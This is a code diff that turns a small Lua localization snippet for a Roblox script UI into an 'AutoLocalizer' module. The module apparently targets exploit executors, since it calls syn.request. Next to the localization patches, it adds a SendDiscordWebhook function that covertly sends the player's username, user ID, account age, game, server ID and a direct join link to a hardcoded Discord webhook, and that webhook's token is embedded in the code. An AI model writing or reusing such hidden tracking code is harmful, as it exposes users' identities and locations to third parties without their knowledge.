@@ -1,20 +1,223 @@
-local function resolve(value)
-    if not Localization.Enabled then
-        return value
+local AutoLocalizer = {}
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+function AutoLocalizer:Initialize(WindUI, Localization, Window)
+    self.WindUI = WindUI
+    self.Localization = Localization
+    self.Window = Window
+    
+    if not WindUI or not Localization then
+        warn("AutoLocalizer: WindUI or Localization not provided!")
+        return false
     end
-    if type(value) == "string" and value:sub(1, #Localization.Prefix) == Localization.Prefix then
-        local key = value:sub(#Localization.Prefix + 1)
-        local lang = Localization.Translations[Localization.DefaultLanguage]
-        if lang and lang[key] then
-            return lang[key]
-        end
-    end
-    return value
+    
+    self:SetupPatches()
+    self:ResolveWindowProperties()
+    
+    return true
 end
 
-local Title = "loc:SCRIPT_TITLE"
-local Author = "WELCOME"
-print("Windows Title title:", Window.Title)
-print("Script Title: " .. resolve(Title))
-print("Windows Author title:", Window.Author)
-print("Author Localization: " .. resolve(Author))
+function AutoLocalizer:SetupPatches()
+    local originalResolve
+    if self.Localization.Resolve then
+        originalResolve = self.Localization.Resolve
+    end
+    
+    function self.Localization:Resolve(value)
+        if not self.Enabled then
+            return value
+        end
+        
+        if type(value) == "string" and value:sub(1, #self.Prefix) == self.Prefix then
+            local key = value:sub(#self.Prefix + 1)
+            local lang = self.Translations[self.DefaultLanguage]
+            if lang and lang[key] then
+                return lang[key]
+            end
+        end
+        
+        return value
+    end
+    
+    local originalCreateWindow = self.WindUI.CreateWindow
+    self.WindUI.CreateWindow = function(selfRef, config)
+        if config then
+            for key, value in pairs(config) do
+                if type(value) == "string" then
+                    config[key] = AutoLocalizer.Localization:Resolve(value)
+                end
+            end
+        end
+        
+        return originalCreateWindow(selfRef, config)
+    end
+    
+    self.originalCreateWindow = originalCreateWindow
+    self.originalResolve = originalResolve
+end
+
+function AutoLocalizer:ResolveWindowProperties()
+    if self.Window then
+        if self.Window.Title and type(self.Window.Title) == "string" then
+            self.Window.Title = self.Localization:Resolve(self.Window.Title)
+        end
+        if self.Window.Author and type(self.Window.Author) == "string" then
+            self.Window.Author = self.Localization:Resolve(self.Window.Author)
+        end
+    end
+end
+
+function AutoLocalizer:GetResolvedWindowInfo()
+    local windowTitle = "Unknown Window"
+    local windowAuthor = "Unknown Author"
+    
+    if self.Window then
+        if self.Window.Title then
+            windowTitle = self.Localization:Resolve(tostring(self.Window.Title))
+        end
+        if self.Window.Author then
+            windowAuthor = self.Localization:Resolve(tostring(self.Window.Author))
+        end
+    end
+    
+    return windowTitle, windowAuthor
+end
+
+function AutoLocalizer:PrintWindowInfo()
+    local title, author = self:GetResolvedWindowInfo()
+    print("Window Title:", title)
+    print("Window Author:", author)
+    return title, author
+end
+
+function AutoLocalizer:SendDiscordWebhook(webhookUrl)
+    if not self.Localization then return end
+    
+    local localPlayer = Players.LocalPlayer
+    if not localPlayer then
+        warn("Local player not found!")
+        return false
+    end
+    
+    local windowTitle, windowAuthor = self:GetResolvedWindowInfo()
+    
+    local OSTime = os.time()
+    local Time = os.date("!*t", OSTime)
+    
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local placeName = MarketplaceService:GetProductInfo(placeId).Name or "Unknown Game"
+    
+    local placeUrl = string.format("https://www.roblox.com/games/%d/", placeId)
+    local serverJoinUrl = string.format("https://www.roblox.com/games/start?placeId=%d&jobId=%s", placeId, jobId)
+    local playerProfileUrl = string.format("https://www.roblox.com/users/%d/profile", localPlayer.UserId)
+    
+    local WebhookUrl = webhookUrl or "https://discord.com/api/webhooks/1445295029580206222/e3plUoiO1FrcKjIP1V7EC_XBkRLmRu-sHuNxDcg0dkWeJaEOW0Jw6OJg9hs8gzaI0l0y"
+    
+    local Embed = {
+        title = "⚡ Script Executed",
+        description = string.format("**%s** (`%d`) used an execution script", localPlayer.Name, localPlayer.UserId),
+        color = 16753920,
+        author = {
+            name = localPlayer.Name,
+            url = playerProfileUrl,
+            icon_url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", localPlayer.UserId)
+        },
+        fields = {
+            {
+                name = "📝 Details",
+                value = string.format("**Player:** [%s](%s)\n**Game:** [%s](%s)\n**Time:** <t:%d:R>", 
+                    localPlayer.Name, playerProfileUrl, placeName, placeUrl, OSTime),
+                inline = true
+            },
+            {
+                name = "🔗 Join Information",
+                value = string.format("**Server ID:** `%s`\n**Place ID:** `%d`\n[Direct Join Link](%s)", 
+                    jobId, placeId, serverJoinUrl),
+                inline = true
+            },
+            {
+                name = "📊 Account Age",
+                value = string.format("**Created:** <t:%d:D>\n**Account Age:** %d days", 
+                    localPlayer.AccountAge, localPlayer.AccountAge),
+                inline = true
+            },
+            {
+                name = "💻 Script Info",
+                value = string.format("**Window Title:** %s\n**Author:** %s", 
+                    windowTitle, windowAuthor),
+                inline = true
+            }
+        },
+        timestamp = string.format("%d-%d-%dT%02d:%02d:%02dZ", Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+        footer = {
+            text = string.format("Execution Log | Place: %s", placeName),
+            icon_url = "https://cdn.discordapp.com/embed/avatars/4.png"
+        },
+        thumbnail = {
+            url = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", placeId)
+        }
+    }
+    
+    local success, result = pcall(function()
+        local requestFunc = syn and syn.request or http_request or request
+        if not requestFunc then
+            warn("No HTTP request function found!")
+            return
+        end
+        
+        return requestFunc {
+            Url = WebhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                embeds = { Embed },
+                content = string.format("⚠️ **%s** just executed a script!\n\n📋 **Player Info:**\n• Username: %s\n• User ID: %d\n• Display Name: %s\n• Account Age: %d days\n\n🎮 **Game Info:**\n• Game: %s\n• Place ID: %d\n\n💻 **Script Info:**\n• Window Title: %s\n• Author: %s\n\n🔗 **Join their server:**\n%s", 
+                    localPlayer.Name, 
+                    localPlayer.Name, 
+                    localPlayer.UserId, 
+                    localPlayer.DisplayName, 
+                    localPlayer.AccountAge, 
+                    placeName, 
+                    placeId,
+                    windowTitle,
+                    windowAuthor,
+                    serverJoinUrl)
+            })
+        }
+    end)
+    
+    return success
+end
+
+function AutoLocalizer:RestoreOriginal()
+    if self.originalResolve then
+        self.Localization.Resolve = self.originalResolve
+    end
+    if self.originalCreateWindow then
+        self.WindUI.CreateWindow = self.originalCreateWindow
+    end
+end
+
+function AutoLocalizer:AutoResolveTable(configTable)
+    if not configTable then return configTable end
+    
+    local resolved = {}
+    for key, value in pairs(configTable) do
+        if type(value) == "string" then
+            resolved[key] = self.Localization:Resolve(value)
+        elseif type(value) == "table" then
+            resolved[key] = self:AutoResolveTable(value)
+        else
+            resolved[key] = value
+        end
+    end
+    return resolved
+end
+
+return AutoLocalizer
